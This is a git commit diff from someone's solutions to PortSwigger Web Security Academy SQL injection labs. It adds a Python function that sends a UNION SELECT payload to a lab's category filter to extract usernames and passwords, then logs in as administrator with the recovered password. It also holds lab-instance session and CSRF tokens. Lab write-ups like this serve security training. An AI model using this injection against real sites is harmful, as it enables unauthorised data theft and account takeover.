01dcc2517bb69bcc3eb8e3906a6a123c78bda5aa
Bradley Neumaier <neumaierbradley@gmail.com>
2020-05-13 21:29:18 -0400

    Solve retrieve data from other tables lab

--- sqli/union-attacks.py
+++ sqli/union-attacks.py
@@ -1,13 +1,16 @@
 # https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
 # https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+# https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
 
 import requests
 requests.packages.urllib3.disable_warnings()
 
-url = "https://acf41f8c1e2e2754807f03fc00d70052.web-security-academy.net/filter"
+base = "https://ac651f4d1e173933800c27ee00450003.web-security-academy.net"
+path = "/filter"
+url = base + path
 proxy = "127.0.0.1:8080"
 proxies = {"https": proxy, "http": proxy}
-cookies = {"session": ""}
+cookies = {"session": "W3v9bhxkX3IXCZnRFbyugBAOMY1f2GmB"}
 verify = False
 
 def determineNumberOfColumnsLab():
@@ -45,5 +48,28 @@ def findColumnContainingTextLab():
         params = {"category": q}
         requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)
 
+def retrieveDataFromOtherTables():
+    def getPassword():
+        username = "username"
+        password = "password"
+
+        q = f"' UNION SELECT {username}, {password} FROM users-- "
+        params = {"category": q}
+        requests.get(url, params=params, cookies=cookies, verify=verify, proxies=proxies)
+
+    def loginWithPassword():
+        username = "administrator"
+        password = "y0j2xzbsm1xu3aghso67"
+
+        q = f"' UNION SELECT {username}, {password} FROM users-- "
+        data = {"csrf": "WKs3hfGISY4BwMNheiZM0ZPG6vZJJjw8", "username": username, "password": password}
+        url = base + "/login"
+        requests.post(url, data=data, cookies=cookies, verify=verify, proxies=proxies)
+
+    getPassword()
+    # loginWithPassword()
+
+
 # determineNumberOfColumnsLab()
-findColumnContainingTextLab()
+# findColumnContainingTextLab()
+retrieveDataFromOtherTables()
